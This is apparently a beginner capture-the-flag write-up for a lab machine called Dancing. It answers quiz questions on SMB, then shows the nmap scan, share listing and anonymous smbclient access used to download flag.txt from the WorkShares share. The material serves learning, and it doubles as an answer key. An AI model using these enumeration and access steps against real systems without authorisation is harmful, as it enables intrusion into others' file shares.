# First Windows machine

We connect to the machine as usual by openvpn.

And here we got some questions to answer.

**What does the 3-letter acronym SMB stand for?**
-*Server Message Block*

**What port does SMB use to operate at?**
-*445*

**What network communication model does SMB use, architecturally speaking?**
-*client-server model*

**What is the service name for port 445 that came up in our nmap scan?**
-*microsoft-ds*

**What is the tool we use to connect to SMB shares from our Linux distribution?**
-*smbclient*

**What is the `flag` or `switch` we can use with the SMB tool to `list` the contents of the share?**
-*"-L"*

**What is the name of the share we are able to access in the end?**
-*WorkShares*

**What is the command we can use within the SMB shell to download the files we find?**
-*get*

### Actions

First we scan the machine on the 445 port and detect it open

```sh
nmap -p 445 -Pn {Machine IP}
```

And discover an open SMB port with microsoft-ds service

*445/tcp open  microsoft-ds*

After that we try to connect to machine by *smbclient* and look the list in it

```sh
smbclient -L {Machine IP}
```

Here we discover WorkShares disk and try to connect it

```sh
smbclient \\\\{Machine IP}\\WorkShares
```

By this command we get into SMB shell and type our commands

```sh
cd WorkShares
dir
cd James.P
get flag.txt
```

After **dir** command we find out *James.P* directory and there is *flag.txt* file.
Submit the flag from it and pwn the Dancing!

**Fin**
